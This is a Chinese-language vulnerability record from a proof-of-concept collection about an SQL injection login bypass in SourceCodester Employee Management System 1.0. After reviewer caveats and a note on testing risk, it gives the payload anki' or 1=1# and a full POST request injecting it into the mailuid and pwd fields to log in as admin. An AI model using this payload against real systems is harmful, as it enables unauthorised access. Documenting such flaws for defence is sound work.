---
source: "Threekiii/Awesome-POC"
title: "SourceCodester Employee Management System aprocess mailuid SQL注入认证绕过"
product: "SourceCodester Employee Management System"
record_type: "vulnerability"
review_status: "text-reviewed"
verification_status: "not-reproduced"
content_status: "needs-review"
primary_identifiers: ""
referenced_identifiers: ""
identifier_status: "unknown"
affected_scope: "1.0；Win10 XAMPP3.2.4示例"
prerequisites: "管理员登录入口，匿名初始会话"
side_effects: "现有材料未完整列明副作用；示例不保证只读或无状态变化"
review_date: "2026-10-02"
source_status: "unknown"
archive_url: "https://github.com/Ares-X/VulWiki/blob/41940cb0038d09ca5aaddbe5bffb923e423d210f/Web%E5%AE%89%E5%85%A8/%E5%95%86%E4%B8%9A%E8%BD%AF%E4%BB%B6/%E5%91%98%E5%B7%A5%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F/%E5%91%98%E5%B7%A5%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%20Employee%20Management%20System%201.0%20%E8%BA%AB%E4%BB%BD%E9%AA%8C%E8%AF%81%E7%BB%95%E8%BF%87.md"
id: "vw-2ef15c422155775b8467f0e1"
entity_id: "ve-2ef15c422155775b8467f0e1"
schema_version: "1"
---

# SourceCodester Employee Management System aprocess mailuid SQL注入认证绕过

## 条目说明

- 对象与具体问题：SourceCodester Employee Management System；aprocess mailuid SQL注入认证绕过
- 版本、配置及部署条件：1.0；Win10 XAMPP3.2.4示例
- 认证与权限前提：管理员登录入口，匿名初始会话
- 核验边界：已完成原始 Markdown 的文本审阅；未执行 PoC、未访问目标、未视检截图。来源所述影响与复现结果不等于本库独立验证。

## 证据边界与更正

以下记录原始资料的证据边界。可以由原文确定的产品、编号及格式问题已在本条修订；没有原始证据的版本、响应和补丁信息仍待核实。

- 本质SQL注入导致认证绕过，应双标签而非泛逻辑漏洞
- mailuid/pwd同时注入未说明实际易受攻击字段，需源码定位或独立参数证据
- EDB48882和源码下载定位较清楚，但无响应/修复；1.0不能扩大所有同名员工管理系统
- 登录Admin声称无后续权限证据，Content-Length需重算

## 操作风险

现有材料未完整列明副作用；示例不保证只读或无状态变化。保留原示例供静态分析；仅可在明确授权的隔离测试环境验证，事先准备备份与回滚。凭据示例如含星号，仅保留首尾用于说明，不能直接使用。

## 技术资料与来源记录

### 漏洞描述

漏洞发现时间：2020-10-16

软件下载地址：https://www.sourcecodester.com/sites/default/files/download/razormist/employee-management-system.zip

验证环境：Windows 10 + xampp v3.2.4

参考链接：

- https://www.exploit-db.com/exploits/48882

### 漏洞复现

打开网址：

```
http://localhost:8081/Employee%20Management%20System/alogin.html
```

通过payload绕过验证：

```
anki' or 1=1#
```

发送请求：

```http
POST /Employee%20Management%20System/process/aprocess.php HTTP/1.1
Host: localhost:8081
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:81.0) Gecko/20100101 Firefox/81.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-GB,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Origin: http://localhost:8081
Connection: close
Referer: http://localhost:8081/Employee%20Management%20System/alogin.html
Cookie: PHPSESSID=i************************v
Upgrade-Insecure-Requests: 1

mailuid=anki%27+or+1%3D1%23&pwd=anki%27+or+1%3D1%23&login-submit=Login
```

> 请求长度说明：原资料 Content-Length 为 70；静态长度已移除，应由客户端根据最终请求体的字节数生成。

将以Admin身份登录应用


---

> 来源：Threekiii/Awesome-POC
